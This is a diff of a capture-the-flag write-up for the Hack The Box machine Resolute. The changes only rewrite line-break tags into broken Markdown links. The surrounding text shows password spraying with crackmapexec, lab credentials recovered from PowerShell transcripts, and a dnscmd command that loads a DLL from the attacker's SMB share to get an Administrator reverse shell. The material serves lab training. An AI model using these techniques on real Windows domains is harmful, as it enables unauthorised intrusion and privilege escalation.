@@ -87,12 +87,12 @@ Host script results:
 
 ## Enum4Linux
 
-Since SMB port is open, We can use Enum4Linux to get any useful information.<br/>
-![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/2.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/2.png)<br/>
+Since SMB port is open, We can use Enum4Linux to get any useful information.[br/](br/)
+![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/2.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/2.png)[br/](br/)
 Found an username and a password for it `marko : Welcome123!`
 
 
-I tried login with them using `Evil-WinRm`and its end failed<br/>
+I tried login with them using `Evil-WinRm`and its end failed[br/](br/)
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%201.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%201.png)
 
 Since Enum4Linux reveals more user names, we can password spray on them using `crackmapexec`
@@ -125,7 +125,7 @@ ulf
 zach
 ```
 
-Started password spraying on the `winrm`<br/>
+Started password spraying on the `winrm`[br/](br/)
 ```bash
 root@w0lf:~/CTF/HTB/Boxes/Resolute# crackmapexec winrm 10.10.10.169 -u usernames.txt -p 'Welcome123!'
 WINRM       10.10.10.169    5985   NONE             [*] http://10.10.10.169:5985/wsman
@@ -159,8 +159,8 @@ We get `Access is Denied` for use `melanie` so let's try login with that.
 
 ## Getting User Shell
 
-We logged in using `melanie : Welcome123!`<br/>
-![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%202.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%202.png)<br/>
+We logged in using `melanie : Welcome123!`[br/](br/)
+![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%202.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%202.png)[br/](br/)
 While checking the `C:\` I did `ls -force` which reveals hidden files (a feature in evil-winrm) and there is a directory called `PSTranscript`
 
 
@@ -170,14 +170,14 @@ While checking the `C:\` I did `ls -force` which reveals hidden files (a feature
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/hh.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/hh.png)
 
 
-Checking the file reveals user `ryan` password which is `Serv3r4Admin4cc123!`<br/>
+Checking the file reveals user `ryan` password which is `Serv3r4Admin4cc123!`[br/](br/)
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/qq.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/qq.png)
 
 
 ## Getting Shell as Ryan
 
 
-Logged in with `ryan : Serv3r4Admin4cc123!`<br/>
+Logged in with `ryan : Serv3r4Admin4cc123!`[br/](br/)
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%203.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%203.png)
 
 I did `whoami /all` to know about this user.
@@ -258,7 +258,7 @@ dnscmd resolute /config /serverlevelplugindll \\10.10.14.6\share\root.dll
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%204.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%204.png)
 
 
-Started my nc listener and we need to restart the service, so the `dll` will be triggered and we get the shell with Administrator privileges.<br/>
+Started my nc listener and we need to restart the service, so the `dll` will be triggered and we get the shell with Administrator privileges.[br/](br/)
 ![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%205.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-resolute/Untitled%205.png)
 
 We own the System.
